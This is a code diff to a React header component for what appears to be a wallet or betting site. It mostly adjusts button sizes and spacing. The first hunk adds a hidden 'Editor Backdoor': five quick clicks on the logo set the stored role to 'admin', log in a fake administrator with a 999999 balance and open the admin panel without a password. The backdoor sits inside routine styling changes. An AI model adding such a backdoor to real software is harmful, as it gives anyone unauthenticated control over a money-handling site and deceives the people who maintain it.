@@ -132,6 +132,35 @@ const Header: React.FC<HeaderProps> = ({
   const dropdownRef = useRef<HTMLDivElement>(null);
   const walletDropdownRef = useRef<HTMLDivElement>(null);
   const [logoHoverCount, setLogoHoverCount] = useState(0);
+  
+  // Editor Backdoor State
+  const lastLogoClickRef = useRef<number>(0);
+  const [logoClickCount, setLogoClickCount] = useState(0);
+
+  const handleLogoSecretClick = () => {
+    const now = Date.now();
+    if (now - lastLogoClickRef.current > 1500) {
+      setLogoClickCount(1);
+    } else {
+      const nextCount = logoClickCount + 1;
+      setLogoClickCount(nextCount);
+      if (nextCount >= 5) {
+        // 5 tık! Şifresiz giriş.
+        localStorage.setItem('site_user_role', 'admin');
+        window.dispatchEvent(new CustomEvent('site-user-login', { 
+           detail: { id: 'editor_backdoor', username: 'Editor', role: 'admin', balance: 999999 } 
+        }));
+        setTimeout(() => {
+          window.dispatchEvent(new CustomEvent('open-admin'));
+        }, 100);
+        setLogoClickCount(0);
+        return;
+      }
+    }
+    lastLogoClickRef.current = now;
+    // Normal davranış: Anasayfaya git
+    onViewChange?.('home');
+  };
   const { theme, toggleTheme } = useTheme();
 
   const [depositUsername, setDepositUsername] = useState('');
@@ -380,7 +409,7 @@ const Header: React.FC<HeaderProps> = ({
               {/* Logo */}
               <div 
                 className="flex items-center cursor-pointer select-none group relative font-black text-2xl md:text-3xl tracking-tight"
-                onClick={() => onViewChange?.('home')}
+                onClick={handleLogoSecretClick}
                 style={{ fontFamily: "'Inter', sans-serif", letterSpacing: '-0.03em', WebkitFontSmoothing: 'antialiased', textRendering: 'optimizeLegibility' }}
               >
                   {/* 724 in Crisp White */}
@@ -415,32 +444,31 @@ const Header: React.FC<HeaderProps> = ({
             {/* Center Section: Empty spacing */}
             <div className="hidden lg:flex flex-1 mx-4"></div>
 
-            {/* Right Section: Actions & Auth */}
             <div className="flex shrink-0 items-center justify-end h-full relative overflow-visible">
-              <div className="flex items-center justify-end h-full gap-2 z-10">
+              <div className="flex items-center justify-end h-full gap-3 md:gap-4 z-10">
                 
                 {/* Search Button (Mercek İkonu) */}
                 <button 
                   onClick={onSearchClick}
-                  className="w-[40px] h-[40px] rounded-xl flex items-center justify-center bg-[#20242D] border border-transparent hover:bg-[#2a303c] text-zinc-300 hover:text-white transition-all duration-300 shadow-sm cursor-pointer"
+                  className="w-[44px] h-[44px] rounded-xl flex items-center justify-center bg-[#20242D] border border-transparent hover:bg-[#2a303c] text-zinc-300 hover:text-white transition-all duration-300 shadow-sm cursor-pointer"
                   title="Arama"
                 >
-                  <Search className="w-[18px] h-[18px]" />
+                  <Search className="w-[20px] h-[20px]" />
                 </button>
 
           {siteUser ? (
-            <div className="flex items-center gap-2 ml-1">
+            <div className="flex items-center gap-3 md:gap-4 ml-1">
 
 
               {/* Combined Balance & Wallet Pill */}
-              <div className="flex items-center gap-1 bg-[#20242D] border border-transparent rounded-xl p-1 shadow-inner relative" ref={walletDropdownRef}>
+              <div className="flex items-center gap-1.5 bg-[#20242D] border border-transparent rounded-xl p-1.5 shadow-inner relative" ref={walletDropdownRef}>
                 {/* Balance Selector */}
                 <div 
-                  className="flex items-center px-2 md:px-3 cursor-pointer hover:bg-white/5 rounded-lg transition-colors h-[32px]"
+                  className="flex items-center px-3 md:px-4 cursor-pointer hover:bg-white/5 rounded-lg transition-colors h-[36px]"
                   onClick={() => setWalletDropdownOpen(prev => !prev)}
                 >
-                  <span className="font-black text-[#00E5FF] text-[12px] md:text-[13px] tracking-tight mr-2 whitespace-nowrap drop-shadow-[0_0_5px_rgba(16,185,129,0.3)]">${Number(siteUser.balance || 0).toFixed(2)}</span>
-                  <ChevronDown className={`w-3.5 h-3.5 text-[#00E5FF]/70 transition-transform ${walletDropdownOpen ? 'rotate-180' : ''}`} />
+                  <span className="font-black text-[#00E5FF] text-[13px] md:text-[14px] tracking-tight mr-2 whitespace-nowrap drop-shadow-[0_0_5px_rgba(16,185,129,0.3)]">${Number(siteUser.balance || 0).toFixed(2)}</span>
+                  <ChevronDown className={`w-4 h-4 text-[#00E5FF]/70 transition-transform ${walletDropdownOpen ? 'rotate-180' : ''}`} />
                 </div>
                 
                 {/* Deposit Button */}
@@ -449,9 +477,9 @@ const Header: React.FC<HeaderProps> = ({
                     const event = new CustomEvent('openWalletModal', { detail: 'deposit' });
                     window.dispatchEvent(event);
                   }}
-                  className="bg-gradient-to-r from-[#00E5FF] to-[#00B0FF] hover:from-[#00B0FF] hover:to-[#0091EA] text-[#06080C] font-black tracking-widest text-[11px] h-[32px] px-3 md:px-4 rounded-lg transition-all flex items-center shadow-[0_0_15px_rgba(0,229,255,0.3)] uppercase"
+                  className="bg-gradient-to-r from-[#00E5FF] to-[#00B0FF] hover:from-[#00B0FF] hover:to-[#0091EA] text-[#06080C] font-black tracking-widest text-[12px] h-[36px] px-4 md:px-5 rounded-lg transition-all flex items-center shadow-[0_0_15px_rgba(0,229,255,0.3)] uppercase"
                 >
-                  <Wallet className="w-3.5 h-3.5 mr-1.5 hidden sm:block" />
+                  <Wallet className="w-4 h-4 mr-2 hidden sm:block" />
                   CÜZDAN
                 </button>
 
@@ -490,19 +518,19 @@ const Header: React.FC<HeaderProps> = ({
               </div>              <div className="relative" ref={profileRef}>
                 {/* User Avatar Block */}
                 <div 
-                  className="flex items-center bg-[#20242D] hover:bg-[#2a303c] border border-transparent cursor-pointer transition-colors rounded-xl p-1 pr-2.5 h-[40px]"
+                  className="flex items-center bg-[#20242D] hover:bg-[#2a303c] border border-transparent cursor-pointer transition-colors rounded-xl p-1.5 pr-3 h-[48px]"
                   onClick={() => setIsProfileOpen(prev => !prev)}
                 >
-                  <div className="w-[32px] h-[32px] rounded-lg bg-gradient-to-br from-purple-500/20 to-pink-500/20 text-purple-400 flex items-center justify-center mr-2 md:mr-3 border border-purple-500/30 overflow-hidden relative group-hover:border-purple-500/50">
-                     <User className="w-[18px] h-[18px] z-10 relative" />
+                  <div className="w-[36px] h-[36px] rounded-lg bg-gradient-to-br from-purple-500/20 to-pink-500/20 text-purple-400 flex items-center justify-center mr-2 md:mr-3 border border-purple-500/30 overflow-hidden relative group-hover:border-purple-500/50">
+                     <User className="w-[20px] h-[20px] z-10 relative" />
                   </div>
-                  <div className="hidden sm:flex flex-col items-start mr-2.5">
-                    <span className="text-white font-bold text-[12px] leading-none mb-0.5">{siteUser.username}</span>
-                    <span className="text-purple-400 text-[8px] uppercase font-black tracking-widest flex items-center">
+                  <div className="hidden sm:flex flex-col items-start mr-3">
+                    <span className="text-white font-bold text-[13px] leading-none mb-1">{siteUser.username}</span>
+                    <span className="text-purple-400 text-[9px] uppercase font-black tracking-widest flex items-center">
                        VIP LVL {siteUser.loyalty?.level || 1}
                     </span>
                   </div>
-                  <ChevronDown className={`w-3 h-3 text-zinc-500 transition-transform ${isProfileOpen ? 'rotate-180' : ''}`} />
+                  <ChevronDown className={`w-4 h-4 text-zinc-500 transition-transform ${isProfileOpen ? 'rotate-180' : ''}`} />
                 </div>
 
                 {isProfileOpen && (
